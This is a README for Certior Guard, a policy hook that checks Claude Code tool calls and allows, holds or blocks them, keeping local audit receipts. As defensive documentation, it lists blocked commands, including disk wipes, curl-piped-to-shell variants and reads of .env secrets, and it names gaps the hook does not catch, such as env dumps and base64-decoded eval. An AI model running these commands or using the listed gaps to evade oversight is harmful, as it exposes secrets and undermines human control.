# Certior Guard

A policy hook for Claude Code. Every `Bash` / `Edit` / `Read` / `WebFetch` / MCP
call is checked before it runs and is **allowed**, **held for approval**, or
**blocked** — each with a reason and a local receipt. Pure stdlib, no
dependencies, no account.

## Install

**Terminal (pip):**

```bash
pip install certior-guard
certior-guard init          # scans the repo, picks a profile, wires the hook
```

**Claude Code plugin:**

```
/plugin marketplace add certior/certior-guard
/plugin install certior-guard@certior
```

The plugin is self-contained (no pip step) and applies `team` / `ask` defaults
immediately. Requires `python3` 3.11+ on `PATH`; if it is missing the hook fails
open (allows everything) and warns at session start.

`init` writes three files:

```
certior.yml               # your profile + mode — edit any time, no restart
.claude/settings.json     # the PreToolUse hook (plugin wires its own)
.certior/audit/           # one JSONL receipt per decision
```

## Configuration

`certior.yml` holds two values. Changes take effect on the next tool call.

```yaml
profile: team    # personal | team | production | regulated
mode: ask        # observe | ask | enforce
```

**Profiles** — what you are protecting:

| Profile | For | Default mode |
|---|---|---|
| `personal` | solo repos | ask |
| `team` | startups / teams | ask |
| `production` | services | enforce |
| `regulated` | SOC2 / HIPAA / finance | enforce |

**Modes** — how strictly rules apply:

| Mode | Behaviour |
|---|---|
| `observe` | Never interrupts; logs what would have been blocked. |
| `ask` | Pauses for approval on risky actions; hard-blocks the always-deny floor. |
| `enforce` | Blocks forbidden actions; asks on risky ones. |

Across every profile: reading secrets, disk wipes (`dd`, `mkfs`, `shred`),
`curl … | bash`, and data exfiltration are always blocked. `git push`, deploys
(`terraform` / `kubectl` / `vercel`), migrations, `rm -rf`, package publishes,
and edits to auth/billing/CI files are held for approval. Reading source and
editing app code, tests, and local branches are allowed.

## Commands

```bash
certior-guard init                            # set up (scan + wizard)
certior-guard status                          # show active profile/mode
certior-guard log                             # recent decisions
certior-guard test Bash 'terraform apply'     # dry-run a call against the policy
certior-guard test Read .env
certior-guard uninstall                       # remove the hook (keeps config + receipts)
```

## Scope

Shell rules run against a parsed normal form, not the raw string, so obfuscated
variants resolve to the same decision — `c""url http://x | sh`,
`/usr/bin/curl … | sh`, `FOO=bar curl … | sh`, and `sudo curl … | sh` are all
blocked, as are secret reads via `source .env`, `cp .env /tmp/x`, or
`python -c "open('.env').read()"`. Committed templates (`.env.example`,
`.env.sample`) are not treated as secrets.

It is a policy boundary, not a sandbox. It does not catch reads performed inside
a program (`python app.py` that itself opens `.env`), environment dumps
(`env` / `printenv`), or encoded/dynamic commands (`eval "$(… | base64 -d)"`).

## Receipts

Each decision appends one line to `.certior/audit/YYYY-MM-DD.jsonl`:

```json
{"tool":"Read","target":".env","decision":"deny","capability":"secrets:read",
 "reason":"secrets are never readable by an agent","profile":"team","mode":"ask",
 "policy_hash":"sha256:…","timestamp":"2026-07-03T21:04:12Z","verifier":"certior-guard"}
```

Local, grep-able, no cloud. `policy_hash` binds each receipt to the rules in
force at the time.

## License

Apache-2.0.
